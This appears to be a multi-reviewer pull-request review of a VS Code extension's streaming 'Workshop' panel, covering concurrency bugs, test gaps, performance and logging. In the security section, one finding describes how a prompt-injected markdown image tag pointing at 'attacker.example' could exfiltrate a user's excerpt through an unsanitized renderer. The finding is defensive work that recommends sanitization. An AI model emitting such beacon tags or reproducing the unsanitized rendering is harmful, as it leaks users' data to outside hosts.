# PR Review — feat(workshop): Sprint 02 — Session Spine (single streaming turn, host-side session)

**Author:** okeylanders · PR #67 · `claude/sprint-02-session-spine-skndyo` → `epic/workshop-editor-tab`

## Resolution ledger

Status is the reviewer's **initial recommendation**, not a verdict — update the `Status`
column as findings are addressed so this file stays a living record. Legend: **Open** =
act before merge · **Deferred** = real issue, safe to punt for a stated reason (track it)
· **Addressed** = fixed · **Partially addressed** = fixed with a noted remainder · **N/A**
= out of scope, superseded, or praise (nothing to resolve).

| # | Sev | Finding | Reviewers | Consensus | Status |
|---|-----|---------|-----------|-----------|--------|
| 1 | 🟠 High | `useWorkshop` is the only domain hook with zero tests — and it holds the webview half of reload-safety | Cal, Bria | 🎯 | **Open** |
| 2 | 🟠 High | The multicast fix is never tested with two live handlers receiving concurrent delivery | Cal | — | **Open** |
| 3 | 🟠 High | `handleSetExcerpt` has no active-run guard — mid-run re-pin silently misattributes the finished turn | Sam | — | **Open** |
| 4 | 🟠 High | Preempted/reset/zombie runs leave no request- or tool-correlated log trail | Oliver | — | **Open** |
| 5 | 🟡 Standard | Listener-set/unsubscribe/try-catch primitive hand-written 4× (5th prior-art copy already existed) | Marcus, Parker | 🎯 | **Open** |
| 6 | 🟡 Standard | `WorkshopApp.tsx` monolith: extract turn bubble + excerpt panel; add memo boundary around the thread | Parker, Tim | 🎯 | **Open** |
| 7 | 🟡 Standard | Streaming tests assert per-type counts, never cross-message order the webview handshake depends on | Cal | — | **Open** |
| 8 | 🟡 Standard | Live-run identity tracked three ways at once in `useWorkshop` | Parker | — | **Deferred** — correct today; collapse to one ref when touching the hook (pairs with #16) |
| 9 | 🟡 Standard | Zero-payload messages use `interface {}` against the 9-for-9 `Record<string, never>` house idiom | Stan | — | **Open** |
| 10 | 🟡 Standard | ErrorBoundary `componentStack` silently dropped on the Workshop surface (sidebar keeps it) | Stan | — | **Open** |
| 11 | 🟡 Standard | `countWords` re-splits the full excerpt on every streamed token | Tim | — | **Open** |
| 12 | 🟡 Standard | Full-history snapshot re-cloned and re-broadcast on every mutation, uncapped | Tim | — | **Deferred** — non-issue at today's scale; cap/diff before Sprint 3 makes long threads normal |
| 13 | 🟡 Standard | Untrusted model markdown → `dangerouslySetInnerHTML`, no sanitizer; `img-src https:` allows beacon exfil | Patricia | — | **Deferred** — inherited surface (sidebar identical); sanitize once in shared `MarkdownRenderer` as follow-up |
| 14 | 🟡 Standard | Architecture witness regex never extended to `WorkshopSessionService` — "news nothing" unenforced | Bria | — | **Open** |
| 15 | 🟡 Standard | Preempted run's `finally` fires ungated `sendStatus('')`, blanking the new run's ticker | Sam | — | **Open** |
| 16 | 🟢 Nit | Bubble-retire effect deps on unstable `streaming` object — live bubble retires early (brief flicker) | Blake | — | **Open** |
| 17 | 🟢 Praise | `CancellableStreamingDomain` — deferred scope enforced by the compiler, not a comment | Marcus | — | **N/A** — praise |
| 18 | 🟢 Praise | WorkshopHandler lifecycle is a zero-drift mirror of AnalysisHandler's new pattern | Stan | — | **N/A** — praise |
| 19 | 🟢 Praise | CSPRNG nonce carry-over (#15, PR 66) completely and correctly done, both surfaces | Patricia | — | **N/A** — praise |
| 20 | 🟢 Praise | Fan-out isolates and logs throwing listeners — one webview's bug can't blind the other | Oliver | — | **N/A** — praise |

---

## Blast Radius

- 34 files changed · +2694 / −272 · 6 commits
- New files: 7 (2 of them test suites) · Migrations: n/a (VS Code extension) · New services: 2 — `WorkshopSessionService` (host-side session aggregate) + `WorkshopHandler` (the 12th domain handler)
- The webview goes live this sprint: real streamed model output renders in the Workshop panel for the first time, and two webviews now share one `CoreServices`.
- Note: at 3,868 diff lines this PR exceeds the review harness's ~800-line focus threshold — all ten reviewers read the full diff, with per-lane focus pointers.

---

## Report Card

| Category | Grade |
| --- | --- |
| 🏛️ Architecture | B |
| 🛡️ Security | B |
| 🧪 Tests | C+ |
| 📖 Quality | B− |
| ⚡ Performance | B− |
| 🎯 Domain | C+ |

---

## Executive Briefing

Zero blockers — Blake traced preemption, reset-mid-run, zombie completion, dispose ordering, and reload contracts against real source and the requestId guards hold at both layers. The high-severity findings all live at the seams of *verification*, not in the runtime spine:

🟠 **[Cal · Bria]** 🎯 `useWorkshop` untested — the only hook in `hooks/domain/` without a test (10 of 10 siblings have one), and it carries the webview half of the sprint's headline reload-safety criterion; the sprint doc's precise test tally stops exactly at the host boundary.

🟠 **[Cal]** The load-bearing multicast fix is never exercised at its own seam — no test puts two live handlers on one Set and asserts both receive delivery, and the mocks structurally can't distinguish handler A's registration from B's, so "dispose blinds the survivor" has no regression net.

🟠 **[Sam]** Mid-run excerpt re-pin misattribution — `handleSetExcerpt` has no active-run guard, the disable on the rail's edit button only lands after a message round-trip, and `WorkshopTurn` carries no excerpt provenance, so a finished turn can silently describe text that's no longer pinned.

🟠 **[Oliver]** Designed disappearances leave no trail — preempted, reset, and zombie-refused runs produce zero request- or tool-correlated log lines; the only trace is an anonymous orchestrator "Streaming cancelled (N chars)" line, exactly now that two surfaces stream concurrently through one manager.

---

## 🏛️ Marcus · Architecture & Design

"The Cartographer of Layer Boundaries"

### 🟡 Standard — Listener-multicast pattern hand-written four times instead of once [🎯 Consensus]

`packages/core/src/infrastructure/api/orchestration/AIResourceManager.ts:51` — The steal/blind fix itself is the right call — composition-root-owned singletons, per-webview listeners, unsubscribe-on-dispose. But the mechanism that makes it work is written out independently four times in this diff, not extracted once: `AIResourceManager` (`tokenUsageListeners` / `tokenUsageFanout` / `addTokenUsageListener`), `AssistantToolService`, `DictionaryService`, and `CategorySearchService` (each with `statusListeners` / `addStatusListener` / emit loop). Each is structurally identical: a `Set<Listener>`, an `addXListener` returning an unsubscribe closure, and a dispatch loop that isolates per-listener failures with a try/catch and an `outputChannel` log line. Searched the repo for an existing shared primitive (`Emitter`, `Multicast`, `Listeners`, `Signal`, `Notifier`…) — not found; this PR had a clean opportunity to introduce one and instead wrote the same ~15 lines four times. That's duplication of *knowledge* (the dispatch contract), not just text — the next service that needs to survive two webviews gets a fifth copy to keep in sync rather than a constructor argument.

### 🟢 Praise — Deferred scope enforced at compile time, not by comment

`packages/core/src/shared/streamingCancelMessages.ts:22` — `CancellableStreamingDomain = Exclude<StreamingDomain, 'workshop'>` is a new abstraction that earns its keep. Rather than a `// TODO: workshop cancel not wired yet`, the `Record<CancellableStreamingDomain, …>` signature makes `createCancelRequestMessage('workshop', …)` a compile error until the composer sprint adds workshop back into the union. One line, precisely scoped to the actual gap, trivially deletable when Sprint 3 lands the cancel wire. Institutional memory lives in the type checker instead of a comment someone will stop reading in a month.

> *"The layer boundaries are sound and the composition root finally behaves like one — I'd just ask why the same listener seam got tailored four separate times instead of cut once and shared."* — Marcus

---

## 🔥 Blake · Staff Engineer

"She's Been Paged for This Before"

**No blocking findings.** Blake traced every escalation path against real source, not mocks: preempt / reset-mid-run / zombie completion (requestId-keyed guards at both the handler and the aggregate; a stale run can never clear the live one, and the aggregate refuses every zombie turn), the preempted stream corrupting the new run's webview state (id-keyed chunk/complete gating in `useWorkshop`, robust regardless of arrival order), the multicast wiring (snapshot iteration, own-registration-only release on dispose, fan-out survives `refreshConfiguration`), reload contracts, genuine AbortSignal threading, and the null/exception surface. Nothing clears her bar.

### 🟢 Nit — Live bubble retires a few ticks early (flicker) — recorded by the orchestrator; Blake judged it below her blocking bar

`packages/core/src/presentation/webview/hooks/domain/useWorkshop.ts:239` — The bubble-retire effect keys on `[turns, streaming]`, and `useStreaming` returns a fresh object every render, so the effect fires on `endStreaming()` and retires the live bubble a few message-ticks early — a brief flicker (streamed text → spinner → final turn) that the `settled` flag was built to prevent. Final state is correct; no corruption, exception, or broken contract. Fix shape: depend on a stable primitive (e.g. `streaming.isStreaming` or a `reset` callback ref) instead of the hook's return object.

> *"I came looking for the 3am page — but the requestId guards hold under both preempt and reset, dispose releases only its own subscriptions, and the aggregate refuses every zombie completion; there's nothing in here that's going to wake me."* — Blake

---

## 🔍 Sam · Bug Hunter

"What if the list is empty, though?"

### 🟠 High — Excerpt re-pin mid-run leaves the completed turn attributed to a silently-replaced excerpt

`packages/core/src/application/handlers/domain/WorkshopHandler.ts:193` — `handleRunTool` snapshots the excerpt once (line 108) and passes that closure-captured copy across the `await` — the *correct* choice for the run itself. The problem is the other side: `handleSetExcerpt` calls `this.session.setExcerpt(...)` unconditionally — no check of `this.activeRun` anywhere in it (searched diff for an in-flight guard inside `handleSetExcerpt` — not found). And it's reachable through normal fast clicking, not just crafted messages: `WorkshopApp.tsx` disables "Replace excerpt…" via `disabled={workshop.isRunning}`, and `isRunning` only flips true after the round-trip `STREAM_STARTED`/`SESSION_STATE` reply lands — a real client-side window right after clicking a tool. When the run completes, the assistant turn (correctly) reflects the OLD excerpt's analysis, but `WorkshopTurn` carries no excerpt id/hash/snapshot — the thread has zero way to indicate "this turn is about text that's no longer pinned." The user just sees an analysis that mysteriously doesn't match the rail. Neither new test suite calls `setExcerpt` while a run is active.

### 🟡 Standard — A preempted run's own `finally` unconditionally blanks status, racing the new run's "Streaming…" text

`packages/core/src/application/handlers/domain/WorkshopHandler.ts:181` — In `handleRunTool`'s `finally`, the `activeRun` clear IS gated (`if (this.activeRun?.requestId === requestId)`) but the `sendStatus('')` right after it is not. `preemptActiveRun` aborts synchronously and the new run's `sendStatus('Streaming NewTool…')` goes out with no `await` in between — so when the old run's suspended promise settles, its `finally` blanks the new run's status for the rest of the stream's visible duration. `StatusPayload` carries no requestId and `handleStatusMessage` filters only by source, so the webview can't tell a stale blank from a live one. The same ungated shape pre-exists in `AnalysisHandler` (downgraded per the cross-cutting rule) — but Workshop's single-slot design makes preemption the *primary, documented* interaction, not incidental overlap. None of the 12 WorkshopHandler tests exercise overlapping runs or assert STATUS ordering across a preemption. *(Independently traced and confirmed by the orchestrator before the panel reported.)*

> *"Found the trap door: swap the excerpt mid-run and the finished turn just keeps quiet about it — no hash, no snapshot, no 'this was about the old text,' the thread will swear up and down it's talking about whatever's pinned now."* — Sam

---

## 📖 Parker · Code Quality

"Code is Communication, Not Instruction"

### 🟡 Standard — The same listener-set/unsubscribe primitive is hand-rolled five times instead of extracted once [🎯 Consensus]

`packages/core/src/infrastructure/api/services/analysis/AssistantToolService.ts:76` — This PR writes the same ~10-line shape four separate times (AssistantToolService, DictionaryService, CategorySearchService, AIResourceManager — identical shape, different noun). And `AccountBalanceService.addRefreshListener` already had this exact pattern *before* this PR — working prior art sitting right there to extract instead of retyping it four more times. A single `ListenerSet<T>` (add → unsubscribe; emit → try/catch fan-out with a caller-supplied log prefix) replaces all five copies, and the next question ("should a throwing listener count toward some limit? should the log line be structured?") gets answered once instead of five times in five slightly-drifting ways.

### 🟡 Standard — Live-run identity is tracked three ways at once in useWorkshop — correct, but a lot to hold in your head

`packages/core/src/presentation/webview/hooks/domain/useWorkshop.ts:97` — "Is a run live" is tracked via `currentRequestId` (state, drives `isRunning`), `currentRequestIdRef` (a ref shadow), and `liveRunRef` (`{requestId, settled}`, drives the streaming bubble). They move in lockstep except in the "stream finished, turn hasn't arrived" window, where clearing is split between a dedicated effect and `handleSessionState`'s no-run branch — whichever fires first. I traced all four handlers plus the effect and believe it's correct — but that's the point: a tired reader shouldn't have to hand-simulate message order to trust it. Collapsing to one ref — `{requestId, phase: 'streaming' | 'settled'} | null`, with `currentRequestId` derived — turns three moving parts into one.

### 🟡 Standard — WorkshopApp.tsx is hiding two ready-made components inside its ~390-line body [🎯 Consensus]

`packages/core/src/presentation/webview/WorkshopApp.tsx:217` — `renderTurn` takes only `turn` (plus module-level `TOOL_ICONS`) and branches into two unrelated JSX shapes — it's a `<WorkshopTurnBubble turn={turn}/>` in everything but name, recreated every render, sitting oddly next to the file's own convention of extracting shared visuals into `./components/shared/`. The "Working Excerpt" block (state, `pinDraft`/`beginEditingExcerpt`, ~55 lines of JSX) depends on exactly three props and would halve the rail as `<ExcerptPanel>`. Worth doing now — Sprint 3's composer and Sprint 4's tools modal are both about to land in this same file.

> *"It all works, but I had to walk three ref names through four message handlers to trust the streaming bubble wouldn't double-fire — and that's before finding the two components hiding inside this one 500-line file."* — Parker

---

## 🧪 Cal · Test Coverage & Quality

"Confidence Levels, Not Coverage Numbers"

### 🟠 High — The multicast fix's actual behavior — two live handlers, one Set, concurrent delivery — is never exercised

`packages/core/src/__tests__/application/handlers/MessageHandler.test.ts:79` — The suite has exactly one place where two MessageHandlers coexist, and it only checks that the shared *session snapshot* reaches both — a plain shared object, unrelated to the listener refactor. It never fires a token-usage or status event and asserts both surfaces receive it: the literal behavior this PR calls "THE LOAD-BEARING FIX." The dispose test is purely sequential (create → dispose → create), so it can't catch "disposing A blinds still-open B" — the exact bug in the PR description. The fakes make this structurally impossible to catch even by accident: `categoryAddStatusListener` returns the same dispose fn regardless of which handler registered, and `capturedTokenUsageCallback` is a single variable overwritten on each registration. The real Set-based fan-out has zero direct unit tests — searched diff and repo: no `AIResourceManager.test.ts` or `AssistantToolService.test.ts` exists at all. Also unverified: the per-handler idle gating (`WorkshopHandler.ts:67`, `AnalysisHandler.ts:50`) — both suites mock `addStatusListener` as `jest.fn(() => jest.fn())` and never capture-and-invoke the listener to prove status is suppressed while idle.

### 🟡 Standard — WorkshopHandler streaming test never pins cross-message order, only per-type counts

`packages/core/src/__tests__/application/handlers/domain/WorkshopHandler.test.ts:141` — The file's only order-capable helper, `postedTypes()`, is used exactly once — in a single-message test with nothing to order. The multi-message run test asserts STREAM_STARTED/CHUNK/COMPLETE/WORKSHOP_TURN only via independently filtered arrays — never the sequence WorkshopHandler actually produces (user TURN → SESSION_STATE → STARTED → chunks → COMPLETE → assistant TURN → SESSION_STATE). That order is load-bearing on the webview side: `useWorkshop` keeps the live bubble alive until the assistant turn lands. A refactor that moved `postTurn(assistantTurn)` ahead of `sendStreamComplete()` would silently break that handshake — and this suite stays green throughout.

### 🟡 Standard — useWorkshop.ts is the one domain hook in this codebase with no test — not a convention, a gap [🎯 Consensus]

Searched the diff and `__tests__/presentation/webview/hooks/domain/` — no `useWorkshop.test.ts`, no `WorkshopApp` test anywhere. Applying the sibling baseline honestly: `WorkshopApp.tsx` untested is NOT a deviation (`App.tsx` has zero tests too — house convention; dropped per Rule B). `useWorkshop.ts` is the opposite case: every other file in `hooks/domain/` ships a dedicated test. It's the sole exception, and it isn't trivial — 295 lines carrying the client-side half of this sprint's reload-safety claim: snapshot adoption of a mid-run `activeRequestId`, the `liveRunRef`/"settled" handshake, the StrictMode-safe ref mirror. None of that reconciliation logic has a single assertion.

> *"Twenty-two new tests and not one of them puts two handlers in the room at the same time to watch the multicast actually multicast — I've seen this movie, and the blinded-survivor scene always gets cut from the trailer."* — Cal

---

## 🗂️ Stan · Codebase Standards

"He Has Every Pattern Memorized"

### 🟡 Standard — Workshop's zero-payload messages use `{}` instead of the house `Record<string, never>` idiom

`packages/core/src/shared/types/messages/workshop.ts:99` — Every other zero-payload message in the codebase — nine of them, across sources.ts, ui.ts, publishing.ts, configuration.ts, warnings.ts — extends `MessageEnvelope<Record<string, never>>` directly, with no named payload interface at all. That's 9-for-9 on the established idiom. `WorkshopResetSessionPayload {}` and `WorkshopRequestSessionPayload {}` (line 105) are the only two places in the whole message layer using an empty interface body instead — and `{}` in TypeScript is structurally satisfied by almost any non-nullish value, so unlike its nine siblings this "no payload" contract doesn't actually block a stray field from being smuggled through. Nothing in the lint config catches the drift automatically.

### 🟡 Standard — ErrorBoundary's componentStack detail is silently dropped for the Workshop surface, kept for the sidebar

`apps/vscode-extension/src/application/providers/WorkshopPanelProvider.ts:94` — `WorkshopApp`'s new `handleBoundaryError` posts the exact same envelope as `App.tsx`'s. On the sidebar, the provider forwards every message to the router, so `UIHandler.handleWebviewError` logs the coerced text AND a second `Details:` line carrying `payload.details` (the componentStack). `WorkshopPanelProvider` intercepts with `coerceWebviewErrorText` at the transport layer *before* the router sees the message, logs only the capped text, and `return`s — so the same `UIHandler` sitting in the panel's own MessageHandler never gets the chance. `UIHandler.handleWebviewError` is the only place `details` is ever logged, and it's the one place this surface can't reach. A live crash's stack trace is diagnostically weaker on Workshop than on the sidebar it's supposed to mirror. (Downgraded per the cross-cutting rule: the shared coercer isn't missing, it's consumed at a different layer on this one surface.)

### 🟢 Praise — WorkshopHandler's status-gating + dispose is a faithful, near-verbatim mirror of AnalysisHandler's new lifecycle pattern

`packages/core/src/application/handlers/domain/WorkshopHandler.ts:65` — The multicast fix landing identically at both call sites that needed it: `AnalysisHandler` gates guide-loading status on `activeRequests.size > 0` with a comment that's almost word-for-word what `WorkshopHandler` says, gated on `activeRun` instead — same rationale, same `addStatusListener` → unsubscribe-on-dispose shape, same `dispose()` structure. Two implementations of a brand-new pattern usually drift a little; this one didn't. Good sibling-matching.

> *"We had nine `Record<string, never>` payloads and a UIHandler that's been logging componentStacks for who knows how long — the pattern was sitting right next door on both counts, and workshop still found two ways to not quite knock."* — Stan

---

## ⚡ Tim · Performance

"O(n²) at Scale is an Incident Waiting to Happen"

### 🟡 Standard — Excerpt word count re-split on every render, including every streamed token

`packages/core/src/presentation/webview/WorkshopApp.tsx:258` — `countWords` (`text.trim().split(/\s+/).length`) is called inline in header JSX with no `useMemo` (searched diff for `useMemo`/`React.memo` — not found anywhere in this PR). The excerpt doesn't change during a run, but `WorkshopApp` re-renders on every `STREAM_CHUNK`, so a full split over the entire pinned excerpt runs once per streamed token. Sub-millisecond at a few hundred words — genuinely a non-issue today — but it's O(excerpt) work repeated for zero benefit on every tick of the token clock; pin a chapter and you pay 10× per chunk. One-line `useMemo` fix, zero behavior risk, worth taking now.

### 🟡 Standard — No render isolation between the live stream and the accumulated turn thread [🎯 Consensus]

`packages/core/src/presentation/webview/WorkshopApp.tsx:431` — Header, rail, palette, `workshop.turns.map(renderTurn)`, and the live `StreamingContent` bubble all live in one component with no `React.memo` anywhere in the tree. Every token event re-runs `useWorkshop()` and re-renders all of it — a fresh `.map(renderTurn)` over full turn history per chunk, not just at the 100ms display debounce. `MarkdownRenderer`'s own content-keyed `useMemo` spares the `marked()` re-parse, so it's O(turns) of component/prop-diff work at token rate, not O(turns × parse). Comfortably cheap at today's shape (single panel, threads reset well under 100 turns) — flagged as the first thing to reach for when Sprint 3's continuation lets threads grow, since turn count is exactly the axis this multiplies against on every token. Fix shape: hoist the turn list into a memoized child keyed on `turns`, so only the live bubble subscribes to per-chunk state.

### 🟡 Standard — Full-history snapshot, uncapped, re-cloned and re-broadcast on every session mutation

`packages/core/src/application/services/WorkshopSessionService.ts:143` — `getSnapshot()` deep-clones the *entire* `turns` array every call, and `postSessionState()` ships the full snapshot — not a diff — after every pin, run start, completion/error, and reset, plus per mount and per visibility flush. `turns` only shrinks via explicit `reset()` — searched diff for a cap (`MAX_TURNS`, `slice`, trim) — not found, and no sibling convention exists to have deviated from. At realistic scale this is microseconds and a few hundred KB. The concern is purely the shape: O(total accumulated turns) work and payload, paid in full on every mutation, no ceiling — and it lands on *click*, not spread across a stream. Worth a turn cap or incremental-snapshot design before Sprint 3 makes marathon threads the norm.

> *"Three places doing perfectly reasonable O(n) work and none of them noticed they'd been wired to the token clock — cheap at n<100, and cheap is not the same as free."* — Tim

---

## 🛡️ Patricia · Security

"She Reads Code Like an Attacker Would"

### 🟡 Standard — Untrusted OpenRouter markdown renders as live HTML in Workshop's thread — inherited surface, now doubled

`packages/core/src/presentation/webview/WorkshopApp.tsx:240` — Assistant turn content (and the live streaming bubble) is untrusted remote text from OpenRouter, and it goes straight through `marked()` into `dangerouslySetInnerHTML` with zero sanitization (`MarkdownRenderer.tsx:36`; grepped the whole repo for `DOMPurify|sanitize-html` — none found). This is NOT new — the sidebar uses the exact same components for the same content today, so this is inherited cross-cutting infrastructure, not a Workshop regression; I'm not blocking PR #67 on it. What genuinely changes here: Sprint 1's panel was a static AI-free shell; this is the sprint where real model output starts rendering in that surface, doubling the blast radius. The CSP's nonce blocks classic script injection, but `img-src` is `${webview.cspSource} https: data:` — any HTTPS host — so a prompt-injected `<img src="https://attacker.example/x?d=...">` in a model response (raw HTML passes through `marked()` untouched) fires a real outbound request from the user's machine: the well-known markdown-image-beacon exfiltration pattern for LLM chat UIs, practical rather than theoretical because it's a network egress point. Recommend sanitizing once at the shared `MarkdownRenderer` (DOMPurify with images/links restricted, or disabling raw-HTML passthrough in `marked`), as a follow-up.

### 🟢 Praise — CSPRNG nonce fix (#15) is correctly and completely done, no drift between surfaces

`apps/vscode-extension/src/application/providers/webviewHtml.ts:105` — Verified this properly closes the PR #66 finding. `getNonce()`/`getWebviewHtml()` is the ONE shared implementation for both webviews (both providers route through it; grepped `apps/` for `Math.random`/stray nonce generators — none, no half-migrated surface). `randomBytes(24)` = 192 bits of CSPRNG, base64 to a clean 32-char token (no padding, 24 divisible by 3), valid CSP nonce charset. One fresh value per `getWebviewHtml()` call, reused across that load's CSP meta + three script tags — correct semantics. `script-src` still carries no `unsafe-inline`; `localResourceRoots` still scoped to the extension URI. Nothing widened alongside the nonce change.

> *"The nonce is finally unguessable — now the model's own `<img>` tags are the ones you have to worry about guessing where to send your excerpt."* — Patricia

---

## 🌙 Oliver · Observability & Debuggability

"Would This Failure Leave a Trail at 2am?"

### 🟠 High — Preempted/reset/zombie Workshop runs leave no request- or tool-correlated log — the only trail anywhere is one anonymous, shared orchestrator line

`packages/core/src/application/handlers/domain/WorkshopHandler.ts:142` — Searched diff for log calls in the three silent-drop paths — not found. WorkshopHandler logs exactly three things: excerpt-pin, "Session reset", and `sendError`. Nothing logs `preemptActiveRun()` (fired on second-run preemption AND reset-mid-run) or the `if (cancelled)` branch that actually runs when an aborted run resolves. `WorkshopSessionService.completeToolRun` returns `undefined` for a stale requestId — its own doc comment concedes the aggregate "silently refuses" — and the caller just skips `postTurn`, no else-branch log. Traced deeper: `AIResourceOrchestrator.executeWithoutCapabilities` catches the AbortError itself and *resolves normally* with `cancelled=true` — so WorkshopHandler's own AbortError catch branch (line 171) is effectively dead code for this path, and the orchestrator's `"Streaming cancelled (N chars)"` lines are the ONLY trail for an aborted Workshop run anywhere in the system. Those lines carry no domain, tool, or request id — even though the enclosing method has a `toolName` parameter it logs at request start and never repeats on the cancel lines. This PR is exactly what makes that ambiguity land: sidebar and Workshop now stream concurrently through the same manager. A dev looking at the output channel after "my Workshop result never showed up" gets a character count and nothing else. The abort/zombie tests assert session state; none assert anything about what gets logged.

### 🟢 Praise — Token-usage/status listener fan-out isolates and logs a throwing listener instead of silently killing the broadcast for every other webview

`packages/core/src/infrastructure/api/orchestration/AIResourceManager.ts:62` — This is exactly the failure mode that would have been undiagnosable: two surfaces share one manager/services, each fanning callbacks out to a Set of per-webview listeners. Without the per-listener guard, one listener's exception would abort the loop mid-iteration and silently starve every listener registered after it — one webview's bug blinding the other surface with zero explanation. Instead each call is individually try/caught and logged with a service-tagged line, in all four fan-out sites. A throwing listener is contained and diagnosable; the rest keep running. Good defensive logging exactly where the multi-webview change made it newly necessary.

> *"The result disappears, the log just shrugs 'streaming cancelled, N chars' — no name, no number, no idea whose. That's not a trail, that's a shrug."* — Oliver

---

## 🎯 Bria · Domain Logic & Business Correctness

"Does This Code Actually Do What the Ticket Asked?"

### 🟠 High — useWorkshop.ts is the one domain hook with zero tests — and it's the one holding the reload-safety reconciliation [🎯 Consensus]

`packages/core/src/presentation/webview/hooks/domain/useWorkshop.ts:234` — Every sibling hook in `hooks/domain/` — 10 for 10 — has a matching `*.test.ts` under `__tests__/…/hooks/domain/`. `useWorkshop.ts` doesn't (searched diff for `useWorkshop.test` and `describe('useWorkshop` — not found; repo-wide, only the hook itself exists). This isn't a trivial hook: it owns the webview-side half of the sprint's headline acceptance criterion (reload-safety) — re-adopting a mid-run request from a snapshot, retiring the live bubble without double-rendering. The sprint doc itemizes its test count with real precision — "8 tests; plus 12 WorkshopHandler tests and a MessageHandler-level reload-safety test" — and that tally stops exactly at the host boundary. Unlike the F5-smoke gap and the fake-panel-fixture gap (both explicitly logged with a stated reason for deferring), this gap is never mentioned — it's just absent, on the one hook where the convention was previously 100% consistent.

### 🟡 Standard — Architecture witness never learned Workshop exists — "news nothing" isn't enforced for WorkshopSessionService

`packages/core/src/__tests__/architecture/boundaries.test.ts:57` — Sprint acceptance criterion: "architecture tests confirm the handler is composed from injected services and `new`-s nothing." WorkshopHandler itself is clean — the session arrives via constructor injection. But the only generic witness for this checks a hardcoded five-class regex (`FORBIDDEN_INFRASTRUCTURE_CONSTRUCTION`) that was never extended to include `WorkshopSessionService` (searched diff for "boundaries.test" — not touched by this PR). The new `providerAssembly.test.ts` witness only covers providers constructing `MessageHandler`. So the acceptance claim is true by observation today, not by enforcement: a future `new WorkshopSessionService()` inside any handler would compile, lint, and pass every existing test — while silently forking the reload-safety aggregate this entire sprint is named after.

> *"The sprint doc counts its tests down to the exact number — 8, plus 12, plus 1 — and the tally stops right at the host boundary, one hook short of where reload-safety actually gets rendered to the screen. Probably fine. Probably."* — Bria

---

## 🎓 Sensei · The Teacher

"The Review Is the Lesson. The Code Is the Practice."

### Lesson 1 — The Clamp Outlasts the Grip

Illuminated by: Cal #1, Cal #2, Bria #2 — with Marcus's praise (the compiler-enforced `Exclude` type) as proof the clamp was already in your toolbox

Every claim a PR makes — "dispose can no longer blind the survivor," "COMPLETE precedes the turn," "the handler news nothing" — is held either by an artifact that turns red when it stops being true, or by the pressure of your attention on the day you verified it. Attention is real pressure, like hand-holding a glued joint, but you eventually let go; the deferred-scope type in this very PR shows the alternative — a claim the compiler will defend long after everyone forgets why. Notice where the panel's findings pooled: precisely where something was true by observation rather than by enforcement. The verification was excellent — and it was mortal.

→ Carry forward: After writing the PR description, read each claim and ask: "What, specifically, fails if this sentence stops being true?" If the answer is "a future reader's memory," you are still holding the joint by hand.

### Lesson 2 — Debts Are Inherited; Defenses Are Enrolled

Illuminated by: Cal #3 + Bria #1, Stan #1, Stan #2, Patricia #1, Sam #2 (the pre-existing twin)

When a twelfth sibling joins a family of eleven, its exposures arrive automatically — the shared markdown pipeline's open window, the elder handler's ungated status shape, a doubled blast radius — while every protection waits for a signature: the witness regex, the per-hook test, the house idiom, the error-logging path. This asymmetry is structural, not a lapse of care: copying propagates risk for free and safety only by ceremony, so gaps will always gather on the newest member unless enrollment is made a deliberate act. Your most mature sibling is your best reviewer — each difference between it and the newcomer is either a decision worth recording or an enrollment still pending.

→ Carry forward: When adding instance N of an established pattern, diff it against sibling N−1 twice — once asking "which protections does it carry that mine lacks?" and once asking "which liabilities do we now share, and did my arrival just make this the cheapest moment to retire one at the source?"

### Lesson 3 — Concurrency Retires the Definite Article

Illuminated by: Oliver, Sam #1, Sam #2, Parker #2 — with Blake's clean pass as the control group

The deepest change in this sprint is grammatical: once two runs, two surfaces, two webviews can be in flight, every "the" in the system — *the* status, *the* excerpt, *the* cancelled-stream log line — quietly encodes an assumption of one. The evidence runs both directions: wherever identity rode along (the requestId guards), every race Blake threw bounced off; wherever it did not (status payloads, cancellation traces, a turn that cannot say which excerpt it analyzed), the findings pooled. And when a sprint's headline behaviors are subtractive — preempt, abort, refuse the zombie — each designed disappearance must leave a named trace, or correct behavior becomes indistinguishable from malfunction. Identity belongs on the data and the evidence, not only on the control flow; three parallel trackers for one identity is that identity telling you it has no proper home.

→ Carry forward: After any change that makes two-in-flight possible, ride one real preemption end-to-end through the output channel and ask: could a stranger at 2 a.m. reconstruct what happened to the first run — and does the signal even arrive at the layer where I wrote the handler for it?

### Lesson 4 — Knowledge Wants One Address

Illuminated by: Marcus #1 + Parker #1

The listener-set primitive — Set, unsubscribe closure, per-listener try/catch so one subscriber cannot blind another — is not four snippets of text; it is one piece of knowledge, a dispatch contract, written out longhand four times beside a fifth copy the codebase had already composed. The entire reason the fix exists is that this contract is subtle enough to get wrong, and scattering it to five addresses means the next refinement must be found five times while each address drifts on its own. The moment of transcription is the cheapest extraction moment there will ever be, because it is the only time the full contract lives whole in your working memory — the same reason a fix's regression test is cheapest at fix-time.

→ Carry forward: When your fingers are typing a mechanism they have typed before — above all while fixing it — stop and search for the sentence you are about to write; the codebase may have already said it once, and that prior art is the pattern asking for its name.

### Lesson 5 — Boundaries Are Load-Bearing Twice

Illuminated by: Parker #3 + Tim #2, Tim #1, Tim #3

In a declarative UI, the seams you cut for human comprehension are the same seams the runtime uses to skip work: a five-hundred-line component is not merely long, it is a single re-render region, so every streamed token re-splits the excerpt and re-walks the turn list because nothing tells the machine where the still parts live. The same holds one layer down, where a snapshot that re-clones the entire history on every mutation is a broadcast with no boundary around "what changed." Extraction here is not tidying — it is handing the system the information it needs in order to be lazy. Like an interior wall on a blueprint: drawn to organize rooms for the people, yet it also carries the joists.

→ Carry forward: When a component or aggregate grows past a screen, ask not "is this untidy?" but "what work is the machine forced to repeat because I have not told it where the sameness lives?"

> *"Skill is the strength of your grip while the glue sets; craft is whatever still holds the joint after you have let go."* — Sensei

---

## The Closer

### 🎋 Haiku

> Two windows, one spine —
> spring wind preempts the old stream;
> the monk logs nothing.

---

## Summary

This is a strong sprint: Blake — the panel's blocking-issues specialist — traced every preemption, reset, zombie, dispose, and reload race against real source and found nothing that clears the merge-blocking bar; the requestId-keyed spine holds at both layers, and four separate reviewers left praise for deliberate craft (the compile-time cancel gate, the zero-drift lifecycle mirror, the complete nonce fix, the fault-isolated fan-out). The four High findings all live at the seams of verification rather than in the runtime: the load-bearing multicast fix ships without a test of its own scenario, the webview half of reload-safety is the one untested hook in the codebase, designed disappearances (preempt/reset/zombie) leave no correlated log trail, and a mid-run excerpt re-pin can silently misattribute a finished turn. **Verdict: nearly there** — mergeable on correctness, but items 1–4 (plus the small Opens in the ledger) are exactly the kind of cheap-now, expensive-later work worth landing on this branch before Sprint 3 builds multi-turn on top of these seams.

---

